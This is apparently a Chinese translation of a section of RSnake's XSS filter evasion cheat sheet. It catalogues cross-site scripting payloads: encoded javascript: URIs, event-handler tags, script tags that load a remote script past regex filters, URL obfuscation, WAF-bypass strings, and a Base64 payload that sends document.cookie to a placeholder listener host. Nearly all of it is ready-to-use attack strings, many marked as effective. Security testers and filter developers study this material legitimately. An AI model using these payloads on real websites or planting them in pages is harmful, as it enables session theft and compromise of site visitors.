### 2.11. 使用默认 SRC 属性绕过 SRC 域名过滤器（有效）

这种方法可以绕过大多数 SRC 域名过滤器。将 JavaScript 代码插入事件方法同样适用于注入使用 elements 的任何 HTML 标签，例如 Form, Iframe, Input, Embed 等等。它同样允许将事件替换为任何标签中可用的事件类型，例如 onblur, onclick。下面会给出许多不同的可注入事件列表。由 David Cross 提交，Abdullah Hussam(@Abdulahhusam)编辑。

```html
<img src="#" onmouseover="alert('xxs')" />
```

### 2.12. 使用默认为空的 SRC 属性（无效）

```html
<IMG SRC= onmouseover="alert('xxs')">
```

### 2.13. 不使用 SRC 属性

通过 css 设置 img 大小达到可 mouseover 的情况，方有效。

```html
<img onmouseover="alert('xxs')" />
```

### 2.14. 通过 error 事件触发 alert（有效）

```html
    <IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
```

### 2.15. 使用 IMG 标签中 onerror 属性并对 alert 进行编码（有效）

```html
<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
```

### 2.16. 十进制 HTML 字符实体编码

所有在 IMG 标签里直接使用`javascript:`形式的 XSS 示例无法在 Firefox 或 Netscape 8.1 以上浏览器（使用 Gecko 渲染引擎）运行。

```html
<img
  src="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;"
  &#39;&#88;&#83;&#83;&#39;&#41;
/>
```

### 2.17. 不带分号的十进制 HTML 字符实体编码

```html
<img
  src="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&"
  #0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041
/>
```

### 2.18. 不带分号的十六进制 HTML 字符实体编码

```html
<img
  src="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29"
/>
```

### 2.19. 内嵌 TAB

```html
<img src="jav	ascript:alert('XSS');" />
```

### 2.20. 内嵌编码后 TAB

```html
<img src="jav&#x09;ascript:alert('XSS');" />
```

### 2.81 利用 HTML 引号包含的 XSS

注：源文章内容出现为 httx 的字符，测试改为 http

这在 IE 中测试通过，但还得视情况而定。
它是为了绕过那些允许`<SCRIPT>`但是不允许`<SCRIPT SRC...`形式的正则过滤，即`/<script[^>]+src/i`：

(有效)

```html
<script a=">" src="httx://xss.rocks/xss.js"></script>
```

---

这是为了绕过那些允许 `<SCRIPT>` 但是不允许 `<SCRIPT SRC...` 形式的正则过滤，即`/<script((\s+\w+(\s*=\s*(?:"(.)*?"|'(.)*?'|[^'">\s]+))?)+\s*|\s*)src/i`（这很重要，因为在实际环境中出现过这种正则过滤）
(无效)

```html
<SCRIPT =">" SRC="httx://xss.rocks/xss.js"></SCRIPT>
```

---

另一个绕过此正则过滤`/<script((\s+\w+(\s*=\s*(?:"(.)*?"|'(.)*?'|[^'">\s]+))?)+\s*|\s*) src/i`的 XSS：
(有效)

```html
<SCRIPT a=">" '' SRC="httx://xss.rocks/xss.js"></SCRIPT>
```

---

又一个绕过正则过滤`/<script((\s+\w+(\s*=\s*(?:"(.)*?"|'(.)*?'|[^'">\s]+))?)+\s*|\s*)sr c/i`的 XSS。尽管不想提及防御方法，但如果你想允许`<SCRIPT>`标签但不加载远程脚本，针对这种 XSS 只能使用状态机去防御（当然如果允许`<SCRIPT>`标签的话，还有其他方法绕过）：
(有效)

```html
<SCRIPT "a='>'" SRC="httx://xss.rocks/xss.js"></SCRIPT>
```

---

最后一个绕过此正则过滤`/<script((\s+\w+(\s*=\s*(?:"(.)*?"|'(.)*?'|[^'">\s]+))?)+\s*|\ s*)src/i`的 XSS，使用了重音符（在 Firefox 下无效）：
(无效)

```html
<script a="`">
  ` SRC="httx://xss.rocks/xss.js">
</script>
```

---

这是一个 XSS 样例，用来绕过那些不会检查引号配对，而是发现任何引号就立即结束参数字符串的正则表达式：
(有效)

```html
<script a=">'>" src="httx://xss.rocks/xss.js"></script>
```

---

这个 XSS 很让人担心，因为如果不过滤所有活动内容几乎不可能防止此攻击：
(有效)

```html
<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="httx://xss.rocks/xss.js"></SCRIPT>
```

### 2.82 URL 字符绕过

假定"http://www.google.com/"是不被允许的：

(应换成当前 google 对应的 ip，此处原文 ip 地址 已失效，demo 以 google 域名对应 即时 ip 及其编码为准-海秋)

#### 2.82.1. IP 代替域名(有效)

```html
<a href="http://66.102.7.147/">XSS</a>
```

#### 2.82.2. URL 编码(有效)

```html
<a href="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</a>
```

#### 2.82.3. 双字节编码(未测试)

(注意：还有另一种双字节编码):

```html
<a href="http://1113982867/">XSS</a>
```

#### 2.82.4. 十六进制编码(有效)

每个数字的允许的范围大概是 240 位字符，就如你在第二位上看到的，并且由于十六进制 是在 0 到 F 之间，所以开头的 0 可以省略：

```html
<a href="http://0x42.0x0000066.0x7.0x93/">XSS</a>
```

#### 2.82.5. 八进制编码(有效)

又一次允许填充，尽管你必须保证每类在 4 位字符以上-例如 A 类，B 类等等：

```html
<a href="http://0102.0146.0007.00000223/">XSS</a>
```

#### 2.82.6. Base64 编码(无效)

```html
<img
  onload="eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='))"
/>
```

#### 2.82.7. 混合编码(无效)

混合基本编码并在其中插入一些 TAB 和换行(虽然不知道浏览器为什么允许这样做)。

TAB 和换行只有被引号包含时才有效：

```html
<a
  href="h
tt p://6 6.000146.0x7.147/"
  >XSS</a
>
```

#### 2.82.8. 协议解析绕过(有效)

(// 替代 http://可以节约很多字节).当输入空间有限时很有用(少两个字符可能解决大问题) 而且可以轻松绕过类似"(ht|f)tp(s)?://"的正则过滤(感谢 Ozh 提供这部分).你也可以将"//" 换成"\\"。你需要保证斜杠在正确的位置，否则可能被当成相对路径 URL：

```html
<a href="//www.google.com/">XSS</a>
```

#### 2.82.9. Google 的"feeling lucky" part 1

Firefox 使用 Google 的"feeling lucky"功能根据用户输入的任何关键词来让用户跳转到其认为最可能的网站。如果你存在漏洞的页面在某些随机关键词上搜索引擎排名是第一的，你就可以利用这一特性来攻击 Firefox 用户。这使用了 Firefox 的"keyword:"协议。你可以像下面一样使用多个关键词"keyword:XSS+RSnake"。这在 Firefox2.0 后不再有效。

```html
<a href="//google">XSS</a>
```

#### 2.82.10. Google 的"feeling lucky" part 2

这是用了一个仅在 Firefox 上有效的小技巧，因为他实现了"feeling lucky"功能。不像下面一个例子，这个在 Opera 上无效因为 Opera 会认为这个是一个老式的 HTTP 基础认证钓鱼攻击，但它并不是。他只是一个异常的 URL，如果你点击了对话框确定，它就可以生效。但是在 Opera 上会是一个错误错误对话框，所以认为其不被 Opera 所支持，同样在 Firefox 2.0 后不再有效。

```html
<a href="http://ha.ckers.org@google">XSS</a>
```

#### 2.82.11. Google 的"feeling lucky" part 3

这是一个异常的 URL，只作用于 Firefox 以及 Opera，因为他们实现了"feeling lucky"功能.像上面的例子一样，他要求你的攻击页面在 Google 上特定关键词排名第一(在这个示例里关键词是"google")

```html
<a href="http://google:ha.ckers.org">XSS</a>
```

#### 2.82.12. 移除别名

当结合上面的 URL，移除"www."会节约 4 个字节，总共为正确设置的服务器节省 9 字节:

```html
<a href="http://google.com/">XSS</a>
```

#### 2.82.13. 绝对 DNS 后额外的点

```html
<a href="http://www.google.com./">XSS</a>
```

#### 2.82.14. JavaScript link location

```html
<a href="javascript:document.location='http://www.google.com/'">XSS</a>
```

#### 2.82.15 内容替换作为攻击向量

```html
<a href="http://www.google.com/ogle.com/">XSS</a>
```

#### 2.83. 字符转义表

下面是 HTML 和 JavaScript 中字符"<"所有可能的组合。其中大部分不会被渲染出来，但是其中许多可以在某些特定情况下呈现。

```
<
%3C
&lt
&lt;
&LT
&LT;
&#60
&#060
&#0060
&#00060
&#000060
&#0000060
&#60;
&#060;
&#0060;
&#00060;
&#000060;
&#0000060;
&#x3c
&#x03c
&#x003c
&#x0003c
&#x00003c
&#x000003c
&#x3c;
&#x03c;
&#x003c;
&#x0003c;
&#x00003c;
&#x000003c;
&#X3c
&#X03c
&#X003c
&#X0003c
&#X00003c
&#X000003c
&#X3c;
&#X03c;
&#X003c;
&#X0003c;
&#X00003c;
&#X000003c;
&#x3C
&#x03C
&#x003C
&#x0003C
&#x00003C
&#x000003C
&#x3C;
&#x03C;
&#x003C;
&#x0003C;
&#x00003C;
&#x000003C;
&#X3C
&#X03C
&#X003C
&#X0003C
&#X00003C
&#X000003C
&#X3C;
&#X03C;
&#X003C;
&#X0003C;
&#X00003C;
&#X000003C;
\x3c
\x3C
\u003c
\u003C
```

### 3. 绕过 WAF(Web Application Firewall)的方法 - 跨站脚本

通用问题

- 存储型 XSS

如果攻击者已经让 XSS 绕过过滤器，WAF 将无法阻止攻击透过。

- 基于 Javascript 的反射型 XSS

```
实例: <script> ... setTimeout(\"writetitle()\",$_GET[xss]) ... </script>
利用: /?xss=500); alert(document.cookie);//
```

- 基于 DOM 的 XSS

```
实例: <script> ... eval($_GET[xss]); ... </script>
利用: /?xss=document.cookie
```

#### 通过请求重定向构造 XSS

- 存在漏洞代码

```
 ...
 header('Location: '.$_GET['param']);
 ...
```

同样包括：

```
...
 header('Refresh: 0; URL='.$_GET['param']);
 ...
```

- 这种请求不会绕过 WAF

```
 /?param=javascript:alert(document.cookie)
```

- 这种请求可以绕过 WAF 并且 XSS 攻击可以在某些浏览器执行：

```
 /?param=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
```

#### WAF 绕过字符串

```html
<Img src = x onerror = "javascript: window.onerror = alert; throw XSS">
<Video> <source onerror = "javascript: alert (XSS)">
<Input value = "XSS" type = text>
<applet code="javascript:confirm(document.cookie);">
<isindex x="javascript:" onmouseover="alert(XSS)">
"></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
"><img src="x:x" onerror="alert(XSS)">
"><iframe src="javascript:alert(XSS)">
<object data="javascript:alert(XSS)">
<isindex type=image src=1 onerror=alert(XSS)>
<img src=x:alert(alt) onerror=eval(src) alt=0>
<img  src="x:gif" onerror="window['al\u0065rt'](0)"></img>
<iframe/src="data:text/html,<svg onload=alert(1)>">
<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script
<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
<form><a href="javascript:\u0061lert(1)">X
</script><img/*%00/src="worksinchrome&colon;prompt(1)"/%00*/onerror='eval(src)'>
<style>//*{x:expression(alert(/xss/))}//<style></style>
On Mouse Over​
<img src="/" =_=" title="onerror='prompt(1)'">
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe
<script x> alert(1) </script 1=2
<form><button formaction=javascript&colon;alert(1)>CLICKME
<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
```

#### 3.1 Alert 混淆以绕过过滤器

```
(alert)(1)
a=alert,a(1)
[1].find(alert)
top[“al”+”ert”](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
top[‘al\145rt’](1)
top[‘al\x65rt’](1)
top[8680439..toString(30)](1)
```

### 4. 作者和主要编辑

Robert "RSnake" Hansen

### 5. 贡献者

Adam Lange
Mishra Dhiraj
